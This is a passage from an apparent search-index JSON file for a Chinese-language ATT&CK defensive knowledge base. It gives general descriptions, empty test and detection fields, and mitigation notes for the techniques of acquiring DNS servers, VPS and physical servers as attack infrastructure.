%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_7","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_8","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_9","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_10","text":"MITRE-ATT&CK-T1583-002 https://attack.mitre.org/techniques/T1583/002/ \u4f7f\u7528DNS over HTTPS\uff08DoH\uff09\u6784\u5efa\u5f39\u6027C2\u57fa\u7840\u67b6\u6784 https://xz.aliyun.com/t/3068","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/","text":"T1583-003-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u79df\u7528\u865a\u62df\u79c1\u4eba\u670d\u52a1\u5668\uff08VPS\uff09\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5404\u79cd\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u5c06\u865a\u62df\u673a\u6216\u5bb9\u5668\u4f5c\u4e3a\u4e00\u79cd\u670d\u52a1\u51fa\u552e\u3002\u901a\u8fc7\u5229\u7528VPS\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u5176\uff08\u8ffd\u8e2a\uff09\u96be\u4ee5\u5728\u7269\u7406\u4e0a\u5c06\u884c\u52a8\u4e0e\u4ed6\u4eec\u8054\u7cfb\u8d77\u6765\u3002\u4f7f\u7528\u4e91\u8ba1\u7b97\u57fa\u7840\u8bbe\u65bd\u4e5f\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u5feb\u901f\u63d0\u4f9b\u3001\u4fee\u6539\u548c\u5173\u95ed\u5176\u57fa\u7840\u8bbe\u65bd\u3002 \u83b7\u53d6VPS\u7528\u4e8e\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\uff0c\u5982\u6307\u6325\u548c\u63a7\u5236\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u53d7\u76ca\u4e8e\u4e0e\u8f83\u9ad8\u58f0\u8a89\u7684\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u76f8\u5173\u7684\u666e\u904d\u6027\u548c\u4fe1\u4efb\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4eceVPS\u670d\u52a1\u63d0\u4f9b\u5546\u90a3\u91cc\u83b7\u5f97\u57fa\u7840\u8bbe\u65bd\uff0c\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u5546\u4ee5\u51fa\u79dfVPS\u800c\u95fb\u540d\uff0c\u5176\u6ce8\u518c\u4fe1\u606f\u6781\u5c11\uff0c\u4ece\u800c\u53ef\u4ee5\u66f4\u52a0\u533f\u540d\u5730\u83b7\u5f97\u57fa\u7840\u8bbe\u65bd\u3002 \u6d4b\u8bd5\u6848\u4f8b \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff08\u82f1\u8bed\uff1aVirtual private server\uff0c\u7f29\u5199\u4e3a VPS\uff09\uff0c\u662f\u5c06\u4e00\u53f0\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u670d\u52a1\u3002\u5b9e\u73b0VPS\u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\u548c\u865a\u62df\u673a\u6280\u672f \u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2aVPS\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540cVPS\u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU\u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u201c\u72ec\u5360\u201d\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS\u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8eIDC\u8d44\u6e90\u79df\u7528\u3002 IDC\u8d44\u6e90\u79df\u7528\uff0c\u7531VPS\u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540cVPS\u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6VPS\u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS\u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662fVPS\u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS\u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668VPS\u7684\u4ef7\u683c\u90fd\u9ad8\u4e8e\u865a\u62df\u673aVPS\u7684\u4ef7\u683c\u3002 \u8fd9\u4e9bVPS\u4e3b\u673a\u4ee5\u6700\u5927\u5316\u7684\u6548\u7387\u5171\u4eab\u786c\u4ef6\u3001\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u4ee5\u53ca\u7ba1\u7406\u8d44\u6e90\u3002\u6bcf\u4e2aVPS\u4e3b\u673a\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u72ec\u7acb\u8d85\u5927\u7a7a\u95f4\u3001\u72ec\u7acb\u5185\u5b58\u3001\u72ec\u7acbCPU\u8d44\u6e90\u3001\u72ec\u7acb\u6267\u884c\u7a0b\u5e8f\u548c\u72ec\u7acb\u7cfb\u7edf\u914d\u7f6e\u7b49\u3002VPS\u4e3b\u673a\u7528\u6237\u53ef\u5728\u670d\u52a1\u5668\u4e0a\u81ea\u884c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u4e3b\u673a\u3002\uff08ps:\u4e0d\u505a\u8fc7\u591a\u4ecb\u7ecd\uff0c\u61c2\u5f97\u90fd\u61c2\uff09 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1583-003 https://attack.mitre.org/techniques/T1583/003/","title":"T1583-003-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#t1583-003-","text":"","title":"T1583-003-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u79df\u7528\u865a\u62df\u79c1\u4eba\u670d\u52a1\u5668\uff08VPS\uff09\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5404\u79cd\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u5c06\u865a\u62df\u673a\u6216\u5bb9\u5668\u4f5c\u4e3a\u4e00\u79cd\u670d\u52a1\u51fa\u552e\u3002\u901a\u8fc7\u5229\u7528VPS\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u5176\uff08\u8ffd\u8e2a\uff09\u96be\u4ee5\u5728\u7269\u7406\u4e0a\u5c06\u884c\u52a8\u4e0e\u4ed6\u4eec\u8054\u7cfb\u8d77\u6765\u3002\u4f7f\u7528\u4e91\u8ba1\u7b97\u57fa\u7840\u8bbe\u65bd\u4e5f\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u5feb\u901f\u63d0\u4f9b\u3001\u4fee\u6539\u548c\u5173\u95ed\u5176\u57fa\u7840\u8bbe\u65bd\u3002 \u83b7\u53d6VPS\u7528\u4e8e\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\uff0c\u5982\u6307\u6325\u548c\u63a7\u5236\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u53d7\u76ca\u4e8e\u4e0e\u8f83\u9ad8\u58f0\u8a89\u7684\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u76f8\u5173\u7684\u666e\u904d\u6027\u548c\u4fe1\u4efb\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4eceVPS\u670d\u52a1\u63d0\u4f9b\u5546\u90a3\u91cc\u83b7\u5f97\u57fa\u7840\u8bbe\u65bd\uff0c\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u5546\u4ee5\u51fa\u79dfVPS\u800c\u95fb\u540d\uff0c\u5176\u6ce8\u518c\u4fe1\u606f\u6781\u5c11\uff0c\u4ece\u800c\u53ef\u4ee5\u66f4\u52a0\u533f\u540d\u5730\u83b7\u5f97\u57fa\u7840\u8bbe\u65bd\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_1","text":"\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff08\u82f1\u8bed\uff1aVirtual private server\uff0c\u7f29\u5199\u4e3a VPS\uff09\uff0c\u662f\u5c06\u4e00\u53f0\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u670d\u52a1\u3002\u5b9e\u73b0VPS\u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\u548c\u865a\u62df\u673a\u6280\u672f \u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2aVPS\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540cVPS\u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU\u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u201c\u72ec\u5360\u201d\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS\u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8eIDC\u8d44\u6e90\u79df\u7528\u3002 IDC\u8d44\u6e90\u79df\u7528\uff0c\u7531VPS\u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540cVPS\u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6VPS\u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS\u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662fVPS\u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS\u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668VPS\u7684\u4ef7\u683c\u90fd\u9ad8\u4e8e\u865a\u62df\u673aVPS\u7684\u4ef7\u683c\u3002 \u8fd9\u4e9bVPS\u4e3b\u673a\u4ee5\u6700\u5927\u5316\u7684\u6548\u7387\u5171\u4eab\u786c\u4ef6\u3001\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u4ee5\u53ca\u7ba1\u7406\u8d44\u6e90\u3002\u6bcf\u4e2aVPS\u4e3b\u673a\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u72ec\u7acb\u8d85\u5927\u7a7a\u95f4\u3001\u72ec\u7acb\u5185\u5b58\u3001\u72ec\u7acbCPU\u8d44\u6e90\u3001\u72ec\u7acb\u6267\u884c\u7a0b\u5e8f\u548c\u72ec\u7acb\u7cfb\u7edf\u914d\u7f6e\u7b49\u3002VPS\u4e3b\u673a\u7528\u6237\u53ef\u5728\u670d\u52a1\u5668\u4e0a\u81ea\u884c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u4e3b\u673a\u3002\uff08ps:\u4e0d\u505a\u8fc7\u591a\u4ecb\u7ecd\uff0c\u61c2\u5f97\u90fd\u61c2\uff09","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-003-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_9","text":"MITRE-ATT&CK-T1583-003 https://attack.mitre.org/techniques/T1583/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/","text":"T1583-004-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u670d\u52a1\u5668 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u79df\u8d41\u6216\u79df\u7528\u53ef\u5728\u76ee\u6807\u884c\u52a8\u4e2d\u4f7f\u7528\u7684\u5b9e\u4f53\u670d\u52a1\u5668\u3002\u4f7f\u7528\u670d\u52a1\u5668\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u7b56\u5212\u3001\u53d1\u8d77\u548c\u6267\u884c\u884c\u52a8\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u5668\u6267\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u7528\u4e8e\u6307\u6325\u548c\u63a7\u5236\u3002\u4e0e\u7834\u574f\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u6216\u79df\u7528\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\u76f8\u6bd4\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u9009\u62e9\u914d\u7f6e\u548c\u8fd0\u884c\u81ea\u5df1\u7684\u670d\u52a1\u5668\u6765\u652f\u6301\u884c\u52a8\u3002 \u5982\u679c\u653b\u51fb\u8005\u7684\u5927\u90e8\u5206\u6d3b\u52a8\u5c06\u4f7f\u7528\u5728\u7ebf\u57fa\u7840\u8bbe\u65bd\u8fdb\u884c\uff0c\u4ed6\u4eec\u53ef\u80fd\u53ea\u9700\u8981\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u8bbe\u7f6e\u3002\u6216\u8005\uff0c\u5982\u679c\u4ed6\u4eec\u60f3\u5728\u81ea\u5df1\u7684\u7cfb\u7edf\u4e0a\u6d4b\u8bd5\u3001\u901a\u4fe1\u548c\u63a7\u5236\u5176\u6d3b\u52a8\u7684\u5176\u4ed6\u65b9\u9762\uff0c\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u5efa\u7acb\u5e7f\u6cdb\u7684\u57fa\u7840\u8bbe\u65bd\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1583-004 https://attack.mitre.org/techniques/T1583/004/","title":"T1583-004-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#t1583-004-","text":"","title":"T1583-004-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u79df\u8d41\u6216\u79df\u7528\u53ef\u5728\u76ee\u6807\u884c\u52a8\u4e2d\u4f7f\u7528\u7684\u5b9e\u4f53\u670d\u52a1\u5668\u3002\u4f7f\u7528\u670d\u52a1\u5668\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u7b56\u5212\u3001\u53d1\u8d77\u548c\u6267\u884c\u884c\u52a8\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u5668\u6267\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u7528\u4e8e\u6307\u6325\u548c\u63a7\u5236\u3002\u4e0e\u7834\u574f\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u6216\u79df\u7528\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\u76f8\u6bd4\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u9009\u62e9\u914d\u7f6e\u548c\u8fd0\u884c\u81ea\u5df1\u7684\u670d\u52a1\u5668\u6765\u652f\u6301\u884c\u52a8\u3002 